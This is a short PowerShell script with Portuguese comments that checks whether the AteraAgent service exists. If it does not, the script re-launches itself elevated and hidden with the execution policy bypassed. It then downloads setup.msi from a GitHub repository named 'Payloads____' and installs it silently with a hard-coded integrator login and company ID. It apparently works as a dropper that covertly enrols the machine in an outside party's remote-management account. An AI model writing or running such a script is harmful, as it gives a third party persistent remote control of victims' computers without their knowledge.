$serviceName = "AteraAgent"

# Verificar se o serviço "AteraAgent" está em execução
$service = Get-Service -Name $serviceName -ErrorAction SilentlyContinue

if ($service -eq $null) {
    # Solicitar privilégios administrativos
    $scriptPath = $MyInvocation.MyCommand.Path
    $arguments = "-ExecutionPolicy Bypass -File `"$scriptPath`""
    Start-Process -FilePath "powershell.exe" -ArgumentList $arguments -Verb RunAs -WindowStyle Hidden
    Exit
}

# Parte principal do código
$downloadURL = 'https://github.com/T1Cr4azy/Payloads____/raw/main/setup.msi'
$downloadPath = "$env:USERPROFILE\Desktop\setup.msi"

# Download do arquivo MSI usando o cmdlet 'Invoke-WebRequest'
Invoke-WebRequest -Uri $downloadURL -OutFile $downloadPath

# Verificar se o download foi concluído com sucesso
if (Test-Path $downloadPath) {
    # Executar o arquivo MSI com os argumentos para instalação silenciosa
    Start-Process -FilePath msiexec.exe -ArgumentList "/i `"$downloadPath`" /qn IntegratorLogin=admin@unisonagency.net CompanyId=1" -NoNewWindow -Wait
} else {
    Write-Host "Falha ao baixar o arquivo MSI."
}
